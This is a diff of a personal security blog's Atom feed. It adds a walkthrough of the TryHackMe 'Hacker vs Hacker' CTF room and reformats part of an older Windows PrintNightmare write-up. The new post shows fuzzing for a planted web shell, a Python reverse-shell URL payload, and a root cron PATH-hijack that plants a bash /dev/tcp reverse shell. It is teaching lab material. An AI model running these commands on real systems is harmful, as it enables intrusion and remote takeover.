@@ -1,4 +1,221 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2022-08-20T23:33:18+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Intigriti 1337UP CTF 2022</title><link href="https://darrynbrownfield.co.uk/intigritictf" rel="alternate" type="text/html" title="Intigriti 1337UP CTF 2022" /><published>2022-03-12T00:00:00+00:00</published><updated>2022-03-12T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/intigritictf</id><content type="html" xml:base="https://darrynbrownfield.co.uk/intigritictf">&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cover.gif&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2022-08-21T10:52:11+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Hacker vs Hacker Write up</title><link href="https://darrynbrownfield.co.uk/hackervshacker" rel="alternate" type="text/html" title="Hacker vs Hacker Write up" /><published>2022-08-21T00:00:00+00:00</published><updated>2022-08-21T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/hackervshacker</id><content type="html" xml:base="https://darrynbrownfield.co.uk/hackervshacker">&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/hackervshacker&quot;&gt;Hacker Vs Hacker&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/Aquinas&quot;&gt;Aquinas&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The description for this room is:&lt;/p&gt;
+
+&lt;p&gt;“The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can’t shut it down (they’d lose SEO!) so maybe you can help?”&lt;/p&gt;
+
+&lt;p&gt;So this is going to be different to typical CTF room!&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and was given the target IP 10.10.212.207. I started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial 10.10.212.207
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-08-21 10:32 BST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.212.207
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.076s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: RecruitSec: Industry Leading Infosec Recruitment
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.67 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;2 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - OpenSSH 8.2p1 Ubuntu&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache httpd 2.4.41&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also ran a full port scan but no additional ports were open.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+&lt;p&gt;Checking out the website on port 80, its very basic but at the bottom is a feature to upload a CV.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I created a file called test.txt just so I could try uploading something. However when I submit the request I get the response:&lt;/p&gt;
+
+&lt;p&gt;“Hacked! If you dont want me to upload my shell, do better at filtering!”&lt;/p&gt;
+
+&lt;p&gt;I looked at the source code of the page to see if provide any further information and found:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/hacked.png&quot; alt=&quot;hacked&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to upload a .pdf file but got the same response so it doesn’t look like I can upload my own script to create a shell. Looking at the source code, two things jump out. The first is files are uploaded to ‘/cvs/’. Second the script is checking ‘.pdf’ is included in the filename using the function ‘strpos’.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The strpos() function finds the position of the first occurrence of a string inside another string.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If I was the hacker, to bypass this filtering I would have uploaded a file called something like ‘rce.pdf.php’. So I fuzzed the cvs directory for any files with the extensions ‘.pdf.php’.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.212.207/cvs/FUZZ.pdf.php
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+
+Target: http://10.10.212.207/cvs/FUZZ.pdf.php
+Total requests: 4661
+
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+ID           Response   Lines    Word       Chars       Payload                                                                                                           
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+
+000003693:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;shell&quot;&lt;/span&gt;                                                                                                           
+
+Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
+Processed Requests: 4661
+Filtered Requests: 4660
+Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I got a hit! So now to find the parameter used to execute commands, typically its something like ‘cmd’ which it was but if it wasn’t it could be fuzzed.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id                                                  
+                                                     
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;                                                                                                                           
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                                                                                                                           
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;                                                                                                                           
+                                                                                                                                                                                   
+Target: http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id                                                                                                                             
+Total requests: 4661                                                                                                                                                               
+                                                                                                                                                                                   
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;                                                                                                              
+ID           Response   Lines    Word       Chars       Payload                                                                                                                    
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;                                                                                                              
+                                                                                                                                                                                   
+000000001:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.bash_history&quot;&lt;/span&gt;                                                                                                            
+000000003:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.cache&quot;&lt;/span&gt;                                                                                                                   
+000000012:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.htpasswd&quot;&lt;/span&gt;                                                                                                                
+000000014:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.listings&quot;&lt;/span&gt;                                                                                                        
+000000010:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.hta&quot;&lt;/span&gt;                                                                                                             
+000000015:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.mysql_history&quot;&lt;/span&gt;                                                                                                   
+000000016:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.passwd&quot;&lt;/span&gt;                                                                                                          
+000000011:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.htaccess&quot;&lt;/span&gt;                                                                                                        &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Everything is returning a 200 response so instead of filtering based on the HTTP response code I changed the filter to be based on the characters in the response.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt; 18 http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id
+
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+
+Target: http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id
+Total requests: 4661
+
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+ID           Response   Lines    Word       Chars       Payload                                                                                                           
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+
+000001100:   200        2 L      5 W        72 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;cmd&quot;&lt;/span&gt;                                                                                                             
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
+Processed Requests: 1779
+Filtered Requests: 1778
+Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+&lt;p&gt;Now I have command execution, I first tried to get a shell. I started a netcat listener with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Then from the browser, I entered:&lt;/p&gt;
+
+&lt;p&gt;http://10.10.212.207/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22%22,4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22/bin/bash%22)%27&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A great resource for quickly creating reverse shell commands is https://www.revshells.com&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I got a hit back but shortly afterwards the shell died with the message ‘nope’.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$nc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 4444
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
+connect to &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.212.207] 41984
+www-data@b2r:/var/www/html/cvs&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nope&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The hacker was killing my connection (rude!). So instead of getting a shell I used the ‘shell.pdf.php’ script to enumerate the machine. To make this easier and used Burp and send the request to the Repeater tab.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/home.png&quot; alt=&quot;home&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is a single home directory for lachlan. The ‘.bash_history’ is not empty so I checked that first.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/history.png&quot; alt=&quot;history&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It looks like the password was changed, I tried to login as the lachlan user with the password.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ssh&lt;/span&gt; lachlan@10.10.212.207
+lachlan@10.10.212.207&lt;span class=&quot;s1&quot;&gt;'s password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 21 Aug 2022 10:20:11 AM UTC
+
+  System load:  0.58              Processes:             135
+  Usage of /:   25.1% of 9.78GB   Users logged in:       0
+  Memory usage: 26%               IPv4 address for eth0: 10.10.212.207
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sun Aug 21 10:19:58 2022 from 
+$ nope
+Connection to 10.10.212.207 closed.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The same happened as the python shell, I got kicked out.&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+&lt;p&gt;I looked at the persistence cron.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/persistence.png&quot; alt=&quot;persistence&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The hacker is first setting the path to ‘/home/lachlan/bin:/bin:/usr/bin’ which means it will check the ‘/home/lachlan/bin’ folder for binaries first. Then the cron is running commands to kill any connections. Most of the commands are using absolute paths however, ‘pkill’ is not. So if I can add a file in ‘/home/lachlan/bin/’ with the name ‘pkill’ that should be executed with the permissions of root.&lt;/p&gt;
+
+&lt;p&gt;The lachlan user owns the bin folder so if I can log in using SSH and execute the commands quickly enough I should be able to create the file before the session is killed.&lt;/p&gt;
+
+&lt;p&gt;I copied the following command to my clipboard:&lt;/p&gt;
+
+&lt;p&gt;echo “/bin/bash -c ‘/bin/bash -i &amp;gt;&amp;amp; /dev/tcp//4444 0&amp;gt;&amp;amp;1’” &amp;gt; /home/lachlan/bin/pkill; chmod +x /home/lachlan/bin/pkill&lt;/p&gt;
+
+&lt;p&gt;I restarted my netcat listener, SSH’d to the machine as lachlan and pasted the command. A second later I got a shell!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$nc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 4444
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
+connect to &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.212.207] 41998
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4040&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+root@b2r:~# &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Thats root!&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;p&gt;==========================================================================&lt;/p&gt;
+
+&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Intigriti 1337UP CTF 2022</title><link href="https://darrynbrownfield.co.uk/intigritictf" rel="alternate" type="text/html" title="Intigriti 1337UP CTF 2022" /><published>2022-03-12T00:00:00+00:00</published><updated>2022-03-12T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/intigritictf</id><content type="html" xml:base="https://darrynbrownfield.co.uk/intigritictf">&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cover.gif&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
 
@@ -133,20 +350,20 @@ Archive:  flag.zip
 
 &lt;p&gt;I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial 10.10.11.106
-Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-27 17:20 GMT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.106
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.020s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT
+Nmap scan report for 10.10.11.106
+Host is up (0.020s latency).
 Not shown: 997 filtered ports
 PORT    STATE SERVICE      VERSION
 80/tcp  open  http         Microsoft IIS httpd 10.0
 | http-auth: 
-| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
-|_  Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MFP Firmware Update Center. Please enter password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;admin
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
 | http-methods: 
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=UTF-8).
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 135/tcp open  msrpc        Microsoft Windows RPC
 445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
 Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
@@ -166,7 +383,8 @@ Host script results:
 |_  start_date: 2022-02-27T04:55:51
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;3 Ports open:&lt;/p&gt;
 
@@ -178,16 +396,17 @@ Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds&lt;/span&gt;&lt;/co
 
 &lt;p&gt;I also ran a full port scan and found winrm to be open on port 5985.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap -p- -oA nmap/all_ports 10.10.11.106
-Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-27 17:25 GMT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.106
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
+Nmap scan report for 10.10.11.106
+Host is up (0.026s latency).
 Not shown: 65531 filtered ports
 PORT     STATE SERVICE
 80/tcp   open  http
 135/tcp  open  msrpc
 445/tcp  open  microsoft-ds
-5985/tcp open  wsman&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+5985/tcp open  wsman
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;The web service is showing an unauthorized response however it could be leaking a username with the message “Please enter password for admin”.&lt;/p&gt;
 
@@ -278,38 +497,40 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 
 &lt;p&gt;I used git to clone the repo in to my /opt directory.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; git clone https://github.com/calebstewart/CVE-2021-1675.git
-Cloning into &lt;span class=&quot;s1&quot;&gt;'CVE-2021-1675'&lt;/span&gt;...
-remote: Enumerating objects: 40, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;40/40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;32/32&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 0
-Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;40/40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 131.12 KiB | 932.00 KiB/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Resolving deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
+Cloning into 'CVE-2021-1675'...
+remote: Enumerating objects: 40, done.
+remote: Counting objects: 100% (40/40), done.
+remote: Compressing objects: 100% (32/32), done.
+remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
+Receiving objects: 100% (40/40), 131.12 KiB | 932.00 KiB/s, done.
+Resolving deltas: 100% (9/9), done.
 ┌─[daz@parrotos]─[/opt]
-└──╼ &lt;span class=&quot;nv&quot;&gt;$cd&lt;/span&gt; CVE-2021-1675
+└──╼ $cd CVE-2021-1675
 ┌─[daz@parrotos]─[/opt/CVE-2021-1675]
-└──╼ &lt;span class=&quot;nv&quot;&gt;$ls&lt;/span&gt;
-CVE-2021-1675.ps1  nightmare-dll  README.md&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+└──╼ $ls
+CVE-2021-1675.ps1  nightmare-dll  README.md
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Now using Evil-WinRM I can upload the powershell script and execute it.&lt;/p&gt;
 
